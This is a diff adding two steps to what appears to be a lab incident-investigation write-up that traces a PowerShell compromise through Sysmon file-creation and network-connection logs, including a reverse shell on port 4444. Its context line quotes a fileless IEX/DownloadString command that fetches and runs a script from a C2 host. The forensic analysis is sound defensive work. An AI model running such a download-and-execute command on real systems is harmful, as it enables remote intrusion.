@@ -177,3 +177,45 @@ IEX ((new-object Net.WebClient).DownloadString('http://10.0.0.11:8080/nj6VXD4hqu
 > `Invoke-Expression` + `DownloadString` is a **fileless execution** technique — the attacker downloads a script directly into memory and runs it without writing the main payload to disk. The TLS configuration in the second payload suggests a more sophisticated stager, likely a C2 framework implant (Metasploit/Cobalt Strike/Sliver pattern).
 
 ---
+### Step 5 — Files Dropped to Disk
+
+**Sysmon Event ID 11** (File Create) showed PowerShell dropping `.ps1` files to `sarah`'s temp directory:
+
+> <img width="1324" height="124" alt="6" src="https://github.com/user-attachments/assets/cf1553ef-8512-4bb3-8965-93fe0495af31" />
+
+```
+Process:   PowerShell.exe
+User:      PC01\sarah
+Files:     C:\Users\sarah\AppData\Local\Temp\3__PSScriptPolicyTest_qkov5u21.f.ps1
+C:\Users\sarah\AppData\Local\Temp\3__PSScriptPolicyTest_4h3zq2b3.msq.ps1
+Time:      11:21:33 / 11:21:34
+Rule:      FileCreate
+```
+> ### 🔎 Why Sysmon Event ID 11?
+> EID 11 logs file creation events. The `__PSScriptPolicyTest_*` naming pattern is typical of PowerShell's execution policy bypass — the framework writes a test script to disk to probe and bypass script execution restrictions before running the real payload.
+
+---
+
+### Step 6 — C2 Callback: Reverse Shell on Port 4444
+
+**Sysmon Event ID 3** (Network Connection) confirmed outbound connections from `PowerShell.exe` to the C2 server:
+
+> <img width="1330" height="263" alt="7" src="https://github.com/user-attachments/assets/54d9943a-daa5-45e2-aee9-11679fcd9d00" />
+
+
+> <img width="1333" height="273" alt="8" src="https://github.com/user-attachments/assets/7a01fe10-f0ad-4bc0-a8f2-0fb4c8309568" />
+
+```
+Process:     PowerShell.exe
+User:        PC01\sarah
+Source IP:   10.0.0.50 (PC01)
+Dest IP:     10.0.0.11 (C2 server)
+Ports:       80 (HTTP), 8080 (stager), 4444 (reverse shell)
+Time:        11:21:35 → 11:21:36
+Rule:        NetworkConnect
+```
+
+> ### 🔎 Why Sysmon Event ID 3?
+> EID 3 captures outbound network connections per process. PowerShell reaching out to three different ports on the same internal server is highly suspicious — port `80` for initial callback, `8080` for the stager download, and `4444` which is the **default Metasploit reverse shell port**. This confirms an active C2 session was established.
+
+---
